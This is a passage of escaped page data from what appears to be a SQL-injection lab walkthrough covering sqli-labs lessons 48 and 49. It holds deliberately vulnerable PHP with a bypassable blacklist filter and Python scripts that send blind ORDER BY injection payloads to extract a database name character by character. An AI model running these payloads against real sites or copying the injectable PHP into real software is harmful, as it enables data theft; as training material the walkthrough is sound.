variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e             \u003cspan class=\"token comment\"\u003e//Strip out spaces.\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_replace\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'/union\\s+select/i'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e//Strip out UNION \u0026amp; SELECT.\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string single-quoted-string\"\u003e'id'\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eblacklist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT * FROM users WHERE id=('\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003c/span\u003e') LIMIT 0,1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"2f:T19bc,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token php language-php\"\u003e\u003cspan class=\"token delimiter important\"\u003e\u0026lt;?php\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// WAF implementation with a whitelist approach, only allows input to be numeric.\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function-definition function\"\u003ewhitelist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$input\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$match\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003epreg_match\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"/^\\d+$/\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$input\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$match\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e// ... input is valid\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eelse\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token comment\"\u003e// ... input is invalid\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eheader\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"Location: hacked.php\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// The function below immitates the behavior of parameters when subject to HPP (HTTP Parameter Pollution).\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003efunction\u003c/span\u003e \u003cspan class=\"token function-definition function\"\u003ejava_implementation\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$query_string\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$q_s\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$query_string\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token variable\"\u003e$qs_array\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003eexplode\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"\u0026amp;\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$q_s\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eforeach\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$qs_array\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eas\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$key\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003e\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$value\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token variable\"\u003e$val\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003esubstr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$value\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$val\u003c/span\u003e \u003cspan class=\"token operator\"\u003e==\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"id\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token variable\"\u003e$id_value\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003esubstr\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$value\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e3\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token number\"\u003e30\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ereturn\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$id_value\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003eecho\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"\u0026lt;br\u003e\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n            \u003cspan class=\"token keyword\"\u003ebreak\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e// ...\u003c/span\u003e\n\n\u003cspan class=\"token variable\"\u003e$qs\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_SERVER\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"QUERY_STRING\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$id1\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003ejava_implementation\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$qs\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token function\"\u003ewhitelist\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$id1\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$_GET\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"id\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT * FROM users WHERE id='\u003cspan class=\"token interpolation\"\u003e\u003cspan class=\"token variable\"\u003e$id\u003c/span\u003e\u003c/span\u003e' LIMIT 0,1\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$result\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003emysql_query\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$sql\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token delimiter important\"\u003e?\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"30:T118a,"])</script><script>self.__next_f.push([1,"\u003cspan class=\"token php language-php\"\u003e\u003cspan class=\"token delimiter important\"\u003e\u0026lt;?php\u003c/span\u003e\n\u003cspan class=\"token function\"\u003emysqli_report\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token class-name\"\u003eMYSQLI_REPORT_ERROR\u003c/span\u003e \u003cspan class=\"token operator\"\u003e|\u003c/span\u003e \u003cspan class=\"token class-name\"\u003eMYSQLI_REPORT_STRICT\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$link\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003emysqli_connect\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"localhost\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"my_user\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"my_password\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"world\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token variable\"\u003e$query\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT CURRENT_USER();\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token variable\"\u003e$query\u003c/span\u003e \u003cspan class=\"token operator\"\u003e.=\u003c/span\u003e \u003cspan class=\"token string double-quoted-string\"\u003e\"SELECT Name FROM City ORDER BY ID LIMIT 20, 5\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\n\u003cspan class=\"token comment\"\u003e/* execute multi query */\u003c/span\u003e\n\u003cspan class=\"token function\"\u003emysqli_multi_query\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$link\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$query\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003edo\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e/* store the result set in PHP */\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$result\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003emysqli_store_result\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$link\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$row\u003c/span\u003e \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token function\"\u003emysqli_fetch_row\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$result\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n            \u003cspan class=\"token function\"\u003eprintf\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"%s\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token variable\"\u003e$row\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e[\u003c/span\u003e\u003cspan class=\"token number\"\u003e0\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e]\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n        \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n    \u003cspan class=\"token comment\"\u003e/* print divider */\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eif\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003emysqli_more_results\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$link\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e{\u003c/span\u003e\n        \u003cspan class=\"token function\"\u003eprintf\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string double-quoted-string\"\u003e\"-----------------\\n\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n    \u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e\n\u003cspan class=\"token punctuation\"\u003e}\u003c/span\u003e \u003cspan class=\"token keyword\"\u003ewhile\u003c/span\u003e \u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token function\"\u003emysqli_next_result\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token variable\"\u003e$link\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e\n\u003cspan class=\"token delimiter important\"\u003e?\u003e\u003c/span\u003e\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"31:T5ff,\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e users \u003cspan class=\"token keyword\"\u003eORDER\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eBY\u003c/span\u003e \u003cspan class=\"token number\"\u003e2\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e-- 按照第2列排序（默认升序）\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e users \u003cspan class=\"token keyword\"\u003eORDER\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eBY\u003c/span\u003e rand\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e-- 随机排序\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e users \u003cspan class=\"token keyword\"\u003eORDER\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eBY\u003c/span\u003e username\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e-- 按照用户名排序（默认升序）\u003c/span\u003e\n\u003cspan class=\"token keyword\"\u003eSELECT\u003c/span\u003e \u003cspan class=\"token operator\"\u003e*\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eFROM\u003c/span\u003e users \u003cspan class=\"token keyword\"\u003eORDER\u003c/span\u003e \u003cspan class=\"token keyword\"\u003eBY\u003c/span\u003e username \u003cspan class=\"token keyword\"\u003eASC\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e id \u003cspan class=\"token keyword\"\u003eDESC\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e;\u003c/span\u003e \u003cspan class=\"token comment\"\u003e-- 先按用户名升序排序，再按ID降序排序\u003c/span\u003e\n32:Taf4,"])</script><script>self.__next_f.push([1,"payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?sort=rand(substr(database(),1,1)='!') -- \"\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-48\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nhash_false \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e sha256\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ehexdigest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003etest\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-48\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    hash_resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e sha256\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ehexdigest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\":\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e hash_resp \u003cspan class=\"token operator\"\u003e!=\u003c/span\u003e hash_false\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\ntest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=rand(substr(database(),1,1)='?') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# False\u003c/span\u003e\ntest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=rand(substr(database(),1,1)='s') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# True\u003c/span\u003e\ntest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=rand(substr(database(),2,1)='e') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# True\u003c/span\u003e\ntest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=rand(substr(database(),3,1)='c') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# True\u003c/span\u003e\n"])</script><script>self.__next_f.push([1,"33:Tb5d,"])</script><script>self.__next_f.push([1,"payload \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e \u003cspan class=\"token string\"\u003e\"?sort=x' OR rand(999) \u0026lt; rand(substr(database(),1,1)='!') -- \"\u003c/span\u003e\nresp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-49\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\nhash_false \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e sha256\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ehexdigest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\n\u003cspan class=\"token keyword\"\u003edef\u003c/span\u003e \u003cspan class=\"token function\"\u003etest\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e:\u003c/span\u003e\n    resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e query_get\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"Less-49\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e payload\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    hash_resp \u003cspan class=\"token operator\"\u003e=\u003c/span\u003e sha256\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003eresp\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003etext\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003eencode\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e.\u003c/span\u003ehexdigest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n    \u003cspan class=\"token keyword\"\u003eprint\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003epayload\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e \u003cspan class=\"token string\"\u003e\":\"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e,\u003c/span\u003e hash_resp \u003cspan class=\"token operator\"\u003e!=\u003c/span\u003e hash_false\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e\n\n\ntest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=x' OR rand(999) \u0026lt; rand(substr(database(),1,1)='?') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# False\u003c/span\u003e\ntest\u003cspan class=\"token punctuation\"\u003e(\u003c/span\u003e\u003cspan class=\"token string\"\u003e\"?sort=x' OR rand(999) \u0026lt; rand(substr(database(),1,1)='s') -- \"\u003c/span\u003e\u003cspan class=\"token punctuation\"\u003e)\u003c/span\u003e  \u003cspan class=\"token comment\"\u003e# True\u003c/span\u003e\ntest\u003cspan class=\"token 